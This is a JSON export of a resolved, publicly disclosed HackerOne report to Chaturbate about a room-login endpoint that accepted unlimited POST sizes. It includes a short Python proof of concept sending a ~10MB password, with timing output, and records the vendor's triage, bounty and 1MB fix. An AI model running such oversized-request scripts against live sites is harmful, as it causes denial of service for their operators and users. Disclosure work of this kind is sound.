{"id":418254,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTgyNTQ=","url":"https://hackerone.com/reports/418254","title":"Unrestricted POST request size on roomlogin endpoint","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2018-10-03T14:45:32.783Z","submitted_at":"2018-10-03T14:45:32.783Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"lucach","url":"/lucach","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30475,"url":"https://hackerone.com/chaturbate","handle":"chaturbate","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Chaturbate","twitter_handle":"chaturbate","website":"https://chaturbate.com","about":"The largest online adult cam site"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-10-07T14:55:42.685Z","bug_reporter_agreed_on_going_public_at":"2018-10-07T14:55:42.555Z","team_member_agreed_on_going_public_at":"2018-10-07T00:19:02.572Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"POST requests to endpoint `/roomlogin/\u003cuser\u003e` are not limited in size. While the main website login endpoint correctly limits the size of request, this endpoint does not. This can be a mean to perform a DOS attack.\n\n## Steps To Reproduce:\n\n  1. `\u003cuser\u003e` has a password-protected stream.\n  2. Send a large POST request to `/roomlogin/\u003cuser\u003e` (e.g., a really long password).\n\n## Expected behaviour\nHTTP error 413 is promptly returned.\n\n## Actual behaviour\nServer reads and processes the whole request, consuming long amounts of time.\n\n## POC\nThis Python snippet can reproduce the issue. A ~10MB request consumes about 30 seconds of server time. I did not proceed further to avoid disrupting the service and because this attack which can be easily parallelized has itself a pretty serious impact.\n\n```\nimport requests\nurl = \"https://it.chaturbate.com/roomlogin/█████/\"\ncsrf = \"███████\"\n\npassword_size = 10 * 1000 * 1000\npayload = {'password': 'a' * password_size, 'next': '/████/', 'csrfmiddlewaretoken' : csrf}\n\ns = requests.Session()\ns.headers.update({'referer': url})\ns.cookies.set(\"csrftoken\", csrf)\ns.cookies.set(\"sessionid\", \"█████████\")\nr = s.post(url, data=payload)\n\nprint r.elapsed\n```\n\n```\n0:00:40.249484\n```\n\n## Suggested resolution steps\n\n- Put a reasonable low limit to request size, as it already happens with main login.\n- (Optional) Limit the max-size of input element `#id_password` to 64 characters.\n\n## Impact\n\nDOS of the main website. The attack can be easily parallelized, leading to potentially severe DDOS.","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-11-06T00:19:02.634Z","allow_singular_disclosure_after":-92500759.11429635,"singular_disclosure_allowed":true,"vote_count":14,"voters":["rreiss","ali","w2w","eveeez","an0nym0us","khizer47","k_outis","cryptographer","dolph1n","ry39483","and 4 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":11722,"asset_type":"URL","asset_identifier":"https://chaturbate.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3428478,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"(Human Augmented Signal)\nI confirm that the report is reproducible (POC attached), has a security impact and is in scope (targets main website). \n","automated_response":false,"created_at":"2018-10-03T16:25:29.869Z","updated_at":"2018-10-03T16:25:29.869Z","actor":{"username":"lucach","cleared":false,"url":"/lucach","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3436950,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-10-05T00:58:49.546Z","updated_at":"2018-10-05T00:58:49.546Z","additional_data":{"old_severity":"Medium (6.5)","new_severity":"Low","old_severity_id":218899,"new_severity_id":219924},"actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3436951,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for the report. The login length is limited to prevent a ddos on the hash function, however this doesn't apply for the room login. However we will limit the submit size.","automated_response":false,"created_at":"2018-10-05T01:00:06.294Z","updated_at":"2018-10-05T01:00:06.294Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3436952,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-10-05T01:00:17.058Z","updated_at":"2018-10-05T01:00:17.058Z","actor":{"url":"/chaturbate","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Chaturbate"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"chaturbate","collaborator":{"username":"lucach","url":"/lucach"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3438507,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I perfectly understand the difference between login- and room- passwords, but the significant processing time of such a request still looks pretty worrisome. \n\nThanks for the bounty and the quick response.","automated_response":false,"created_at":"2018-10-05T11:39:05.530Z","updated_at":"2018-10-05T11:39:05.530Z","actor":{"username":"lucach","cleared":false,"url":"/lucach","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3441948,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for the report. This should now be limited to 1MB, can you confirm?","automated_response":false,"created_at":"2018-10-05T21:48:57.700Z","updated_at":"2018-10-05T21:48:57.700Z","actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"lucach","url":"/lucach"},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3443483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm, now the longest request cannot take more than a bunch of seconds of server time, which is a reasonable limit.\n\nWell done and congratulations for the quickness of the process!","automated_response":false,"created_at":"2018-10-06T15:02:25.921Z","updated_at":"2018-10-06T15:02:25.921Z","actor":{"username":"lucach","cleared":false,"url":"/lucach","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3444385,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the confirm!","automated_response":false,"created_at":"2018-10-07T00:19:02.590Z","updated_at":"2018-10-07T00:19:02.590Z","first_to_agree":true,"actor":{"username":"williammmllc","cleared":false,"url":"/williammmllc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3445550,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-10-07T14:55:42.629Z","updated_at":"2018-10-07T14:55:42.629Z","actor":{"username":"lucach","cleared":false,"url":"/lucach","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3445551,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-10-07T14:55:42.720Z","updated_at":"2018-10-07T14:55:42.720Z","actor":{"username":"lucach","cleared":false,"url":"/lucach","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"chaturbate","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}